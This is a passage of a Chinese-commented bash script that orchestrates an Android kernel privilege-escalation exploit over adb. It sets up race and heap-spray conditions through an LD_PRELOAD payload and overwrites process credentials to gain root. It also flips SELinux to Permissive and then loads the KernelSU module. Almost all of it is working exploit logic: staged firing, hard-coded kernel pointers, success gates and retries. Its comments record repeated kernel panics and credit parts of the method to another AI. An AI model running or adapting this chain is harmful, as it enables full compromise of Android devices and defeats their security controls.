    E5) cmd="timeout 86400 env PSELECT_HOLD=1 PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_SELINUX_ENF=1 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=$WINDOW PSELECT_NO_CANARY=1 LD_PRELOAD=$PRELOAD_DEV /system/bin/sleep 180 > ${TMPD}/$name.out 2>&1" ;;
    C)  # ── v8.24 (2026-10-03 08:45, 采纳手机 AI 的源码级证据) ──
        # 手机 AI 从 9/08 现场 (`logs_raw/20260908_hunt1/{cstrike_log.txt,C2.out}`) 给出三条硬证据:
        #   1) 成功那发 C 的 `mt61 ... enter_delay=50000usec` = **默认值**, 不是 4000000;
        #      (`field_auto.sh` 的 4000000 是它自述的"对齐实验", 在窗口已经晚到 20s 的情况下
        #       再加 4s 只会让窗口问题更致命 —— 我 v8.19 的加法是错的, 现撤回。)
        #   2) 成功那发 C 也**没有** PSELECT_TREE_PC/LEFT —— 一并撤回, 逐字对齐 9/08 命令。
        #   3) C 0/7 与 R 崩塌是**同一个病**(迟到上膛), 不是 C 缺参数 ⇒ 先修环境。
        # 保留: PSELECT_TASK(外部模式) 与 PSELECT_KO(9/08 亦有)。
        cmd="sh $FDSH timeout 86400 env PSELECT_HOLD=1 PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=C PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 ${MATISSE_C_EXTRA_ENV:-} $tskenv $koflag PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=${MATISSE_C_WINDOW:-$WINDOW} PSELECT_NO_CANARY=1 LD_PRELOAD=$PRELOAD_DEV /system/bin/sleep 180 > ${TMPD}/$name.out 2>&1" ;;
    E5R) cmd="timeout 86400 env PSELECT_HOLD=1 PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_SELINUX_ENF=1 PSELECT_SELINUX_ENF_VALUE=SPRAY1 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=$WINDOW PSELECT_NO_CANARY=1 LD_PRELOAD=$PRELOAD_DEV /system/bin/sleep 180 > ${TMPD}/$name.out 2>&1" ;;
  esac
  local effw="$WINDOW"; case "$kind" in R) effw="${MATISSE_R_WINDOW:-$WINDOW}";; C) effw="${MATISSE_C_WINDOW:-$WINDOW}";; esac
say "开火 $name (window=${effw}s; 判据驱动提前返回)..."
  rsh "rm -f ${TMPD}/$name.out" 20 >/dev/null   # 防把上一轮残留输出当本轮开火证据
  local ef waited vd
  if [ "${MATISSE_FAST:-1}" = "1" ]; then
    # ── v8.7 (2026-10-02 用户要求"不能直接重启吗"): 判据 ~20s(关窗) / ~0.1s(落地) 就出现,
    #    过去却死等 280s 客户端超时 —— 每轮白等 4 分钟, E5 窗口因此塞不下几次。
    #    现在: 后台起客户端 + 每 5s 查判据标记, 出现即 kill 客户端返回。
    ( "$TIMEOUT_BIN" 86400 "$ADB_BIN" shell "$cmd" >/dev/null 2>&1 ) &
    cpid=$!
    waited=0
    while [ "$waited" -lt "${MATISSE_FAST_MAX:-90}" ]; do
      sleep 5; waited=$((waited + 5))
      vd=$(rsh "grep -aoE 'mid-burst landing|window closed mid-burst|no root after [0-9]+ attempts|storm done at t=[0-9]+ms' ${TMPD}/$name.out 2>/dev/null | tail -1" 15 | tr -d '\r')
      [ -n "$vd" ] && break
    done
    : # v8.52: 不再 kill/wait 本地 adb 客户端 —— 断开连接会对远端持毒进程发 SIGHUP
      # (HOLD 期它是 init_cred 持有者, 被杀会触发 "Attempted to kill init" panic)
      # 客户端由自己的 timeout 收尾, 远端进程保持 park ✓
    say "$name 判据返回: [${vd:-无标记, 到顶}] 用时 ${waited}s (旧版要等 280s)"
  else
    rsh1 "$cmd" 280 | grep -a "RC=" | tail -1
  fi
  ef=$(rsh "getenforce" 20 | tr -d '\r')
  say "$name 完成 enforce=$ef"
}
hb_fresh(){ local now mt age
  now=$(rsh "date +%s" 20 | tr -d '\r'); mt=$(rsh "stat -c %Y ${TMPD}/mt49_child_status.txt" 20 | tr -d '\r')
  case "$now$mt" in ''|*[!0-9]*) return 1;; esac
  age=$((now-mt))
  [ "$age" -le 30 ] && return 0
  say "!! child 心跳陈旧: ${age}s (child 死亡/致盲?)"
  return 1; }
fired_ok(){ local n="$1" sz mt
  # v8.5 (2026-10-02 教训): 崩机时文件系统的 rm 会回滚 —— 可能拉到上一轮的旧 .out。
  # 因此不仅要求文件非空, 还要求它的 mtime 晚于本轮开火时刻 (FIRE_T0), 否则判 STALE。
  sz=$(rsh "wc -c < ${TMPD}/$n.out 2>/dev/null" 20 | tr -dc '0-9')
  case "$sz" in ''|0) return 1 ;; esac
  if [ -n "${FIRE_T0:-}" ]; then
    mt=$(rsh "stat -c %Y ${TMPD}/$n.out 2>/dev/null" 20 | tr -dc '0-9')
    case "$mt" in ''|*[!0-9]*) return 2 ;; esac
    [ "$mt" -ge "$FIRE_T0" ] || return 3      # 3 = 陈旧文件 (崩机回滚), 不是本轮输出
  fi
  return 0; }
gate(){ # v8.1 严格判据 (照 matisse_land.sh:331 rgate): 满帽 + 心跳新鲜, 缺一不算落地
  # 旧判据「含 task= 即落地」会把半写/陈旧状态当落地 -> 拿坏指针打 C -> panic (matisse_land.sh:9-10)
  local st; st=$(rsh "cat ${TMPD}/mt49_child_status.txt 2>/dev/null" 30 | tr -d '\r')
  case "$st" in
    *"CapEff=000001ffffffffff"*) ;;
    ""|*"CapEff=0000000000000000"*) echo "R_MISS"; return ;;
    *) echo "R_PARTIAL"; return ;;
  esac
  hb_fresh || { echo "R_STALE"; return; }
  echo "R_LANDED"; }
gettask(){ rsh "cat ${TMPD}/mt49_child_status.txt" 30 | tr -d '\r' | grep -a '^task=' | tail -1 | cut -d= -f2 | cut -d' ' -f1; }
bootid(){ local out i
  for i in 1 2 3; do
    out=$(rsh "cat /proc/sys/kernel/random/boot_id" 20 | tr -d '\r' | grep -aE '^[0-9a-f]{8}-' | head -1)
    [ -n "$out" ] && { printf '%s\n' "$out"; return 0; }
    [ "$i" -lt 3 ] && sleep 8
  done; echo "READ_FAIL"; return 1; }

if [ "$MATISSE_PREFLIGHT_ONLY" = "1" ]; then
  say "PREFLIGHT_ONLY=1 — 仓库/弹药/取证/体检已完成, 停在开火前 (本次零内核写入)"
  say "下一步(需用户明确同意): MATISSE_ADB=1 bash ksu_persist.sh"
  exit 0
fi

# ── 5b. v8.1: R 重掷(同boot, mt87毒链自清) → E5 gate → C(KO) → E5R ──
# 纪律来源: matisse_land.sh / CHECKPOINT_mt79 / INCIDENT_C_CRASH_20260910:
#   清不干净就跳过本轮; 轮间 >=SPACING(200s) 防两轮重叠堆毒; 连续 MAXFAIL 发停手;
#   输出文件为空 = R_NOT_FIRED 不计命中率; 半程态 R_PARTIAL 绝不打 C。
cleangate || { say "!! 门槛清理失败, 停"; exit 5; }
if [ $# -ge 1 ]; then RMAX=$1; else RMAX=1; fi
# v8.3 (2026-10-02 两次实证, 见 INCIDENT_20261002_W60_reboot.md):
#   同一 boot 的第 2 发 R 会崩 —— 毒链残留 (第 1 发输出正常/NUL=0, 第 2 发 878KB 全 NUL=跑完才崩)。
#   旧文档「mt87 毒链自清 -> 同 boot 可重掷」在本机被证伪。故默认每 boot 只 1 发。
if [ "$RMAX" -gt 1 ] && [ "${MATISSE_ALLOW_MULTI_ROUND:-0}" != "1" ]; then
  say "!! RMAX=$RMAX 被钳到 1: 同一 boot 第 2 发会崩 (2026-10-02 两次实证)"
  say "   确需同 boot 连打: MATISSE_ALLOW_MULTI_ROUND=1 (风险自担); 更稳的做法是重启后再打"
  RMAX=1
fi
RLAND=0; TASK=""; LNAME=""; FAILN=0; NOTFIRED=0
say "R 配置: RMAX=$RMAX WINDOW=${WINDOW}s SPACING=${SPACING}s MAXFAIL=$MATISSE_MAXFAIL"
for ((rr=1; rr<=RMAX; rr++)); do
  say "R 掷 $rr/$RMAX (window=${WINDOW}s, mt87 每轮毒链自清)..."
  if ! cleangate; then
    say "!! 门槛文件清理失败 — 跳过本轮 (不用陈旧状态赌博)"
    continue
  fi
  T0=$(date +%s)
  FIRE_T0=$(rsh "date +%s" 20 | tr -dc '0-9'); FIRE_T0=${FIRE_T0:-}
  fire R$rr R ""
  # v8.2 修复 (2026-10-02 实战): boot 校验必须独立于 fired_ok!
  # 事故: WINDOW=60 那轮把设备打重启, adb 掉线 -> rsh 返回空 -> fired_ok 误判
  # R_NOT_FIRED, 于是 boot 校验没走到, 脚本睡 200s 后准备在新 boot 上打第二发。
  B2=$(bootid)
  if [ "$B2" = "READ_FAIL" ]; then
    say "!! 读不到 boot_id (传输层掉线 或 设备重启中) — 立即中止, 绝不再开火"
    exit 6
  fi
  if [ "$B2" != "$BOOT0" ]; then
    say "!! boot_id 变化: $BOOT0 -> $B2 — 设备已重启, 立即中止 (不在新 boot 上继续开火)"
    true  # v8.52: 不再 pkill sleep —— HOLD 期它是持毒进程, SIGKILL 会触发 "Attempted to kill init" panic
    exit 6
  fi
  fired_ok R$rr; FOK=$?
  if [ "$FOK" = "3" ]; then
    say "R$rr: R_STALE_OUT — ${TMPD}/R$rr.out 的 mtime 早于开火时刻"
    say "       (崩机回滚了 rm: 拿到的很可能是上一轮的残留文件, 本轮证据不可用)"
    NOTFIRED=$((NOTFIRED + 1))
  elif [ "$FOK" != "0" ]; then
    say "R$rr: R_NOT_FIRED (输出文件为空/不可读: 未真正开火 或 传输层掉线)"
    NOTFIRED=$((NOTFIRED + 1))
  else
    G=$(gate)
    say "R$rr: $G"
    SIG=$(rsh "grep -a 'window closed mid-burst\|mid-burst landing\|no root after' ${TMPD}/R$rr.out 2>/dev/null | tail -2" 25 | tr -d '\r')
    if [ -n "$SIG" ]; then printf '%s\n' "$SIG" | while IFS= read -r L; do say "  签名| $L"; done; fi
    if [ "$G" = "R_LANDED" ]; then
      RLAND=1; TASK=$(gettask); LNAME="R$rr"; R_FIRE_T0="${FIRE_T0:-}"
      say "R 落地 task=$TASK (round=$LNAME, R进程起点=$R_FIRE_T0)"
      break
    fi
    [ "$G" = "R_PARTIAL" ] && say "!! 半程态 (CapEff 非零非满帽) — 本轮作废, 绝不打 C"
    FAILN=$((FAILN + 1))
    if [ "$FAILN" -ge "$MATISSE_MAXFAIL" ]; then
      say "!! 连续 $FAILN 发未落地 — 按 mt79 纪律强制停手 (重启或降负载后再来)"
      break
    fi
  fi
  # v8.10: 只有后面还有 R 发次时才需要间隔; RMAX=1(miss 即收工) 时纯属白等 200s
  if [ "$rr" -lt "$RMAX" ]; then
    EL=$(( $(date +%s) - T0 ))
    if [ "$EL" -lt "$SPACING" ]; then
      say "间隔 ${SPACING}s (确保上一轮彻底退场, 防风暴叠加)"
      sleep $((SPACING - EL))
    fi
  fi
done
if [ "$RLAND" != "1" ]; then
  say "!! 本 boot 未落地 (开火 $((RMAX - NOTFIRED)) 发 / 未开火 $NOTFIRED 发)"
  say "   若签名含 'window closed mid-burst' = 迟到饿窗(护栏自保, 已知安全); 对策是【重启后单发重掷】"
  say "   不要放宽窗口(W60 已实测 panic), 也不要同 boot 打第 2 发(已实测崩)"
  exit 5
fi
R11_GATE=R_LANDED
C_FIRED=0; C_TASK_GONE=0; E5OK=0; KMOD=0
BUDGETF="${TMPD}/land_budget_$(printf '%s' "$BOOT0" | cut -c1-8)"

# ── v8.31 (2026-10-03 10:52, 采纳另一会话只读审计的勘误) ──
# 设备掉线/被拒时, rsh 拿回的是**错误文本**而不是空值。任何「非空即命中」的判断都会假阳性:
#   09:55 的 "kernelsu 已在 /proc/modules" 就是这么来的(同一时刻实测 `模块检查: ksu=0`)。
# 同类缺陷已复发 3 次(v8.11 存在性 / v8.20 chmod / v8.28 竞态), 这是第 4 次 ⇒ 统一入口:
#   devbad()  读数含 adb 错误文本 ⇒ 视为**无效证据**(整轮作废, 绝不落成成功)
#   devnum()  数值读数净化(非数字一律 0)
devbad(){ case "$1" in *"adb.exe:"*|*"no devices"*|*"error: "*|*"Permission denied"*|*"not found"*) return 0;; esac; return 1; }
devnum(){ printf '%s' "$1" | tr -dc '0-9' | head -c 12; }

# ── v8.6 关键门: R child 是否仍是我们落地那个 task ──
# 教训 (2026-10-02 21:14): hb_fresh 只看状态文件 mtime, 而**新 child 会刷新同一个文件**,
# 于是心跳"新鲜"但 task= 已换人。旧脚本会用记录的旧 TASK 去打 C —— 写已死 task_struct
# 会 panic (INCIDENT_C_CRASH_20260910)。故必须比对 task= 本身。
rchild_alive(){ local st t i
  # ── v8.28 (2026-10-03 10:22, BUG #16 实测修复) ──
  # E5 轮的 child 也会写同一个门槛文件, 它的 task= 会**短暂覆盖** R child 那一行 ⇒
  # 单次读取会误判"R child 已死"而白白放弃 C。2026-10-03 10:21:13 真实发生: 设备侧文件里
  # task= 明明还是落地那个(ffffff813e563780), R child 也在打 mt47 心跳, 却被 C_TASK_GONE 拦下,
  # 白白浪费了一整轮(那次 R 和 E5 都已成功!)。故改为**多次重读, 任一次匹配即视为存活**。
  for i in 1 2 3 4 5; do
    st=$(rsh "cat ${TMPD}/mt49_child_status.txt 2>/dev/null" 20 | tr -d '\r')
    t=$(printf '%s' "$st" | grep -a '^task=' | tail -1 | cut -d= -f2 | cut -d' ' -f1)
    [ -n "$t" ] && [ "$t" = "$TASK" ] && return 0
    say "  (rchild_alive 第 $i 次读到 task=${t:-空} ≠ $TASK — 可能被 E5 轮 child 覆盖, 3s 后重读)"
    sleep 3
  done
  return 1; }

# ── C 阶段: 拿 uid 0 (必须在 R child 活着时打; 用完每 boot 的 C 预算) ──
# 2026-10-02 21:40 改进: C 命中率仅 ~20%, 而每 boot 预算是 2 次 (MTK slab 铁律),
# 旧实现只打 1 发就放弃 —— 现在在同一个 R 窗口内自动用完预算。
do_c_stage(){
  local maxt="${1:-0}" USED w RA RS att=0 NOWD EL
  # ── v8.12 (2026-10-02 23:45, 用户要求「先查 C 本身」) ──
  # 历史唯一成功的 C (logs_raw/20260908_hunt1/cstrike_log.txt + C2.out) 的时序:
  #   R 跑完(250s) -> sleep 30 -> 整轮 E5(≤250s) -> 才打 C  => C 在 R 设备侧进程**退场之后**才开火,
  #   那次 C 的 mt19b=8986ms(窗口内!) + mt25×6 全打 + child /proc status 显示 Uid: 0 0 0 0。
  # 我们今晚 5 发 C 全部 mt19b=2001x ms(关窗被护栏掐掉), 唯一可疑的系统差异就是
  # **C 在 R 判据出现后 2 秒就开火, 而 R 那个设备侧进程还在跑它的 250s 窗口 -> 重叠**。
  # 因此: C 之前先等 R 进程退场 (默认 260s, 从 R 开火时刻算), 让 C 在干净时序下上膛。
  if [ "${MATISSE_R_DRAIN:-285}" -gt 0 ] && [ -n "${R_FIRE_T0:-}" ]; then
    NOWD=$(rsh "date +%s" 20 | tr -dc '0-9'); NOWD=${NOWD:-0}
    EL=$(( NOWD - R_FIRE_T0 ))
    # v8.22 (2026-10-03 07:20 实测 BUG 修复): 设备若在 R 之后**重启过**, 它的 date +%s 会归零,
    # 于是 EL 变成巨大负数 -> sleep 260-(-1790982857) = 睡 56 年 -> 脚本永久挂死!
    # (2026-10-03 07:16 真实发生: 落地后被 E5 panic 重启, 脚本挂在退场等待上。)
    # 现在: EL 为负或离谱(>1天) 一律视为"设备已重启/时钟异常", 跳过等待并让后面的
    # rchild_alive 门去判 R child 是否还在。
    if [ "$EL" -lt 0 ] || [ "$EL" -gt 86400 ]; then
      say "!! 设备时钟异常或已重启 (elapsed=${EL}s) — 跳过退场等待 (R child 是否还在由 rchild_alive 判)"
    elif [ "$EL" -lt "${MATISSE_R_DRAIN:-285}" ]; then
      say "等 R 设备侧进程退场 (9/08 实测: R 跑满 250s 后再过 30s 才打 C): 已经过 ${EL}s < ${MATISSE_R_DRAIN:-285}s"
      sleep $(( ${MATISSE_R_DRAIN:-285} - EL ))
    fi
  fi
  while :; do
    if [ "$maxt" -gt 0 ] && [ "$att" -ge "$maxt" ]; then break; fi
    USED=$(rsh "cat $BUDGETF 2>/dev/null" 20 | tr -dc '0-9'); USED=${USED:-0}
    if [ "$USED" -ge "$MATISSE_CBUDGET" ]; then
      say "!! 本 boot C 预算已用尽 ($USED/$MATISSE_CBUDGET) — 停止 C"; break; fi
    # v8.20 自愈: 致盲(chmod 000)只有在 fire 正常返回时才恢复 644。若上一轮 fire 中途崩机/掉线,
    # 文件会一直停在 000 -> rchild_alive() 读不到内容 -> 会**误判 R child 已死而停止 C**。
    # 所以每次尝试前先无条件恢复 644。
    rsh "chmod 644 ${TMPD}/mt49_child_status.txt 2>/dev/null" 20 >/dev/null 2>&1
    if ! hb_fresh; then say "!! child 心跳陈旧 — C 停手 (mt86 纪律)"; break; fi
    if ! rchild_alive; then
      say "!! C_TASK_GONE: 状态文件 task= 已不是落地那个 ($TASK) — R child 已死, 拒绝打 C"
      C_TASK_GONE=1; break; fi
    att=$((att+1))
    say "C 击 task=$TASK (本 boot 第 $((USED+1))/$MATISSE_CBUDGET 次; KO=gki209 预开fd, R-child 自动 finit)..."
    rsh "echo $((USED+1)) > $BUDGETF" 20 >/dev/null
    # v8.24: 致盲仪式默认**关闭**(9/08 成功那发没做致盲; 手机 AI 指出 C 的问题不在 C 参数)。
    # 需要时 MATISSE_C_BLIND=1 打开。
    if [ "${MATISSE_C_BLIND:-0}" = "1" ]; then
      rsh "rm -f ${TMPD}/root_alive.txt; chmod 000 ${TMPD}/mt49_child_status.txt 2>/dev/null" 20 >/dev/null 2>&1
    fi
    # v8.39: 门槛那一刻 child 会 open(PSELECT_KO) —— 现在把模块放到位, 让它拿到全新可用的 fd
    if [ -n "${KOV:-}" ]; then
      rsh "cp -f $KOV $KO_LATE && chmod 644 $KO_LATE && echo ok" 25 | tr -d '\r' | while IFS= read -r L; do [ -n "$L" ] && say "  KO_LATE 就位: $L"; done
    fi
    fire "C$att" C "$TASK"
    fire "C$att" C "$TASK"
    rsh "chmod 644 ${TMPD}/mt49_child_status.txt 2>/dev/null" 20 >/dev/null 2>&1
    C_FIRED=1
    # 快版下等待 60s 足够看到 root_alive; 无果就用剩余预算重掷 (老版死等 220s 且只打一发)
    for ((w=0; w<${MATISSE_CWAIT_ITERS:-12}; w++)); do
      sleep 5
      KMOD=$(rsh "grep -c ^ksu /proc/modules 2>/dev/null" 20 | tr -dc '0-9'); KMOD=${KMOD:-0}
      [ "$KMOD" -ge 1 ] && { say "KSU 模块已装入 /proc/modules"; break 2; }
      RA=$(rsh "cat ${TMPD}/root_alive.txt 2>/dev/null | head -1" 20 | tr -d '\r')
      [ -n "$RA" ] && { say "C 落地 root_alive=[$RA]"; break 2; }
      # ── v8.25 修正 (考古): C 落地的**有效判据**是「读主观 cred 或落盘」的四种 ——
      #   L1 child 日志 ROOT-SEEN euid=0   L2 after setres uid=0
      #   L3 root_alive.txt 落盘           L4 uname -n = glroot (sethostname 信标)
      # 而 `/proc/<pid>/status` 的 Uid 四元组**只读 real_cred**(连 euid 也走 __task_cred)
      # ⇒ 它只能证明 **R 落地**, **不能证明 C**（手机 AI 存档里的撤回声明,
      #   phone_conv_20260910_20260913.md:3422/3467/5265）。故下面把 /proc Uid 只当**辅助**。
      UID0=$(rsh "for p in \$(pgrep -x sleep); do awk '\$1==\"Uid:\" && \$2==0 && \$3==0 {print \"HIT \" FILENAME}' /proc/\$p/status 2>/dev/null; done" 25 | tr -d '\r')
      [ -n "$UID0" ] && say "  (辅助) /proc Uid=0: $UID0 — 注意这只证明 R(real_cred), 不作 C 判据"
      HN2=$(rsh "uname -n" 20 | tr -d '\r')
      [ "$HN2" = "glroot" ] && { say "★★ C 落地证据 L4 (sethostname 信标): hostname=glroot"; C_LANDED=1; break 2; }
      # L1/L2: child 日志(stdout= R 轮的 .out) 里的 ROOT-SEEN euid=0 / after setres uid=0 /
      # finit OK —— 这三行**只有** C 换掉主观 cred 之后 child 才会打 ⇒ 是有效 C 判据。
      RS=$(rsh "tail -c 200000 ${TMPD}/$LNAME.out 2>/dev/null | grep -a 'ROOT-SEN\|after setres\|finit_module.*OK' | tail -2" 20 | tr -d '\r')
      [ -n "$RS" ] && { say "★★ C 落地证据 L1/L2 (child stdout): $RS"; C_LANDED=1; break 2; }
      [ $((w % 4)) -eq 0 ] && say "  ...C$att 等待落地 t+$((w*5))s (ksu=$KMOD)"
    done
    KMOD=$(rsh "grep -c ^ksu /proc/modules 2>/dev/null" 20 | tr -dc '0-9'); KMOD=${KMOD:-0}
    RA=$(rsh "cat ${TMPD}/root_alive.txt 2>/dev/null | head -1" 20 | tr -d '\r')
    if [ -n "$RA" ] || [ "$KMOD" -ge 1 ]; then
      say "C 已落地 (root_alive=[${RA:-空}] ksu=$KMOD)"; return 0; fi
    say "C 第 $att 发未中 (root_alive 空, ksu=0) — 用剩余预算重掷 (${MATISSE_CGAP:-15}s 后)"
    sleep "${MATISSE_CGAP:-15}"
  done
  say "模块检查: ksu=${KMOD:-0} root_alive=[${RA:-空}]"
  return 1; }

# ── E5 阶段: 翻 Permissive (按接力文档 §3, E5 只为最后装模块; R child 没了就不空烧) ──
do_e5_stage(){
  local e EF OK2 NOWD EL
  # ── v8.25 (2026-10-03 09:0x, 来自手机 AI 会话考古) ──
  # 考古证据 (phone_conv_20260910_20260913.md:3480/5270): 历史成功流程是
  #   R 落地 → **E5 翻 Permissive** → C 写 cred → R1.out 出现 ROOT-SEEN euid=0 → finit gki209 → E5R
  # 而 2026-10-03 07:15 我们那次 E5 把设备打 panic、毁掉了落地 —— 差别在于**时机**:
  # 历史 E5 是 R 轮跑满 250s 之后才打的 (cstrike_log: "R LANDED ... C strike in 30s"),
  # 而我们当时是 R 判据一出(2 秒后)就打 E5 ⇒ **E5 与 R 的设备侧进程重叠**(与 C 同一个病)。
  # 所以 E5 之前也等 R 设备侧进程退场 (与 do_c_stage 同一套时钟保护)。
  if [ "${MATISSE_R_DRAIN:-285}" -gt 0 ] && [ -n "${R_FIRE_T0:-}" ]; then
    NOWD=$(rsh "date +%s" 20 | tr -dc '0-9'); NOWD=${NOWD:-0}
    EL=$(( NOWD - R_FIRE_T0 ))
    if [ "$EL" -lt 0 ] || [ "$EL" -gt 86400 ]; then
      say "!! E5: 设备时钟异常或已重启 (elapsed=${EL}s) — 跳过退场等待"
    elif [ "$EL" -lt "${MATISSE_R_DRAIN:-285}" ]; then
      say "E5 前等 R 设备侧进程退场 (历史 E5 在 R 跑满后才打): 已经过 ${EL}s < ${MATISSE_R_DRAIN:-285}s"
      sleep $(( ${MATISSE_R_DRAIN:-285} - EL ))
    fi
  fi
  # v8.20 自愈: 若 C 阶段先跑过且致盲没恢复(崩机/掉线), 状态文件可能是 000 —— 先恢复 644,
  # 否则这里的 rchild_alive() 会读不到内容而误判 R child 已死、白白跳过 E5。
  rsh "chmod 644 ${TMPD}/mt49_child_status.txt 2>/dev/null" 20 >/dev/null 2>&1
  for e in a b c d e; do
    if [ "$C_TASK_GONE" = "1" ] || ! rchild_alive; then
      say "!! R child 已不在 (task 不匹配) — 停止 E5 (窗口过期, 不再空烧)"; return 1; fi
    say "E5$e permissive 开窗..."
    fire E5$e E5 ""
    EF=$(rsh 'getenforce' 20 | tr -d '\r')
    say "E5$e 后 enforce=$EF"
    if [ "$EF" = "Permissive" ]; then E5OK=1; return 0; fi
    if printf '%s' "$EF" | grep -q "Server is not running\|timeout"; then
      say "!! rish 掉线 - 等 Shizuku 回来(最多6分钟)..."
      for w2 in 1 2 3 4 5 6 7 8 9 10 11 12; do sleep 30
        OK2=$(rsh 'id -u' 15 | tr -d '\r \n')
        [ "$OK2" = "2000" ] && { say "rish 恢复, 续试 E5"; break; }
      done
    fi
  done
  say "!! E5 5 发未翻 Permissive (R 窗口内未取得开窗)"; return 1; }

# ── KSUD 阶段: 用 C 得到的 root 跑策略修复 + ksud late-load ──
do_ksud_stage(){
  local KN RA2 HASSU w3 KG EV EV2
  KN=$(devnum "$(rsh "grep -c ^kernelsu /proc/modules 2>/dev/null" 20)")
  KN=${KN:-0}
  RA2=$(rsh "cat ${TMPD}/root_alive.txt 2>/dev/null | head -1" 20 | tr -d '\r')
  # ── v8.31 (2026-10-03 10:53) 勘误: v8.27 曾在这里写「09:55 那次 R-child 预开 fd 自动 finit 成功
  # ⇒ 模块已在 /proc/modules」—— **这是假的**。同一份日志 09:55:38 实测 `模块检查: ksu=0`,
  # 09:56:39 `KSU 未装入 (C轮模块=0)`; 中间那句"已在 /proc/modules"是旧代码在**设备掉线拿到错误文本**
  # 时恒真产生的假阳性。设备侧 C1.out 全文 **0 次 finit_module/init_module**。
  # ⇒ **本项目的模块装载路径(finit_module/ksud)至今一次都没走通过** —— 目标一步都没落地。
  # 现值只承认**纯数字且 ≥1** 的 KN; 且 RA2 含 adb 错误文本时视为无效(整轮作废)。
  if devbad "$RA2"; then
    say "!! root_alive 读数是设备错误文本 (整轮证据无效): [$RA2]"; RA2=""
  fi
  if [ "$KN" -ge 1 ] || [ -n "$RA2" ]; then
    say "发现候选证据 (kernelsu=$KN root_alive=[${RA2:-空}]) -> 立刻抓只有 root 能读的证据"
    # v8.23 (2026-10-03 07:25): 目标要求「一旦拿到 root 立刻抓 pstore」。今晚 31+ 次 kernel panic 的
    # 真凶就在 /sys/fs/pstore/* 与 dmesg 里, 而 shell 域**读不了** —— 拿到 root 后**第一件事**就是抓它。
    EV=$(rsh "D=${TMPD}/root_evidence; mkdir -p \$D; cat /sys/fs/pstore/* > \$D/pstore.txt 2>/dev/null; dmesg > \$D/dmesg.txt 2>/dev/null; ls /sys/fs/pstore/ 2>/dev/null | head -3; wc -c \$D/pstore.txt \$D/dmesg.txt 2>/dev/null" 90 | tr -d '\r')
    printf '%s\n' "$EV" | tail -8 | while IFS= read -r L; do say "  evidence| $L"; done
    EV2=$(rsh "for p in \$(pgrep -x sleep); do printf 'pid=%s ' \$p; awk '\$1==\"Uid:\"||\$1==\"CapEff:\"' /proc/\$p/status 2>/dev/null | tr '\n' ' '; echo; done" 40 | tr -d '\r')
    [ -n "$EV2" ] && printf '%s\n' "$EV2" | while IFS= read -r L; do say "  child-cred| $L"; done
    rsh "cat /proc/modules | grep -E '^(ksu|kernelsu)' > ${TMPD}/ksu_modules_proof.txt 2>/dev/null; cat ${TMPD}/ksu_done.txt > ${TMPD}/ksu_done_proof.txt 2>/dev/null" 30 >/dev/null 2>&1
  fi
  # ── v8.32 (2026-10-03 11:0x, 静态查证 main.c:614-693 后新增) ──
  # C 落地 ≠ 模块已装。子进程 gate 命中后要: setresgid/setresuid(0,0,0) → 写 marker →
  # **finit_module(预开 fd) 重试**, 这一切**有延迟**; 且证据行 `mt47: ROOT-SEEN ...` 打在
  # **R child 的 stdout (R1.out)**, 不在 C 轮日志里。
  # 2026-10-03 09:55 那次我们: C 落地后 **1 秒**查 /proc/modules (ksu=0) → **2 秒后**打 E5R
  # 把设备崩掉 ⇒ 子进程的 finit 很可能**根本没来得及完成**。
  # ⇒ 纪律: 有候选证据后**只读轮询最多 180s**, 期间绝不做任何内核写入(E5R 已熔断)。
  local w4 KD
  for w4 in $(seq 1 36); do
    KN=$(devnum "$(rsh "grep -cE '^(ksu|kernelsu)' /proc/modules 2>/dev/null" 20)"); KN=${KN:-0}
    KD=$(rsh "ls ${TMPD}/ksu_done.txt 2>/dev/null | wc -l" 20 | tr -dc '0-9'); KD=${KD:-0}
    if [ "$KN" -ge 1 ]; then say "★★ 模块已在内核! (第 $w4 次轮询 ≈ t+$((w4*5))s, kernelsu=$KN)"; break; fi
    [ "$KD" = "1" ] && say "  ksu_done.txt 出现 (第 $w4 次轮询) — 子进程 finit 报成功, 但模块还不在 /proc/modules?"
    [ $((w4 % 6)) -eq 0 ] && say "  ...等子进程 finit (t+$((w4*5))s; ksu=$KN ksu_done=$KD) — 期间只读, 绝不写内核"
    sleep 5
  done
  # 落地后把**真正的证据文件**(R child 的 stdout)抓下来: ROOT-SEEN / finit / ksu_done 都在那里
  rsh "for n in R1 R2 R3 R4 R5 R6; do f=${TMPD}/\$n.out; [ -f \$f ] || continue; grep -aE 'ROOT-SEN|after setres|finit_module|ksu_done|ROOT MARKER' \$f | head -20 > ${TMPD}/\$n.evidence 2>/dev/null; done" 60 >/dev/null 2>&1
  say "落地证据行 (从 R child stdout 抽取):"
  rsh "cat ${TMPD}/R*.evidence 2>/dev/null | head -12" 40 | tr -d '\r' | while IFS= read -r L; do [ -n "$L" ] && say "  child-evidence| $L"; done
  if [ "$KN" -ge 1 ]; then say "kernelsu 已在 /proc/modules (KN=$KN, 纯数字实测) -> 无需 ksud"; return 0; fi
  if [ -z "$RA2" ]; then say "C 未落地(root_alive 空) -> 跳过 ksud"; return 1; fi
  say "C 已落地 root_alive=[$RA2] -> 等 root child 装好 ${TMPD}/su"
  HASSU=0
  for w3 in 1 2 3 4 5 6 7 8; do
    HASSU=$(rsh "ls ${TMPD}/su 2>/dev/null | wc -l" 20 | tr -d '\r ')
    [ "$HASSU" = "1" ] && break
    say "  未见 su (第 $w3 次), 等 10s"; sleep 10
  done
  say "用 su 执行 ksu_go.sh (策略修复 + ksud late-load) [su 就绪=$HASSU]"
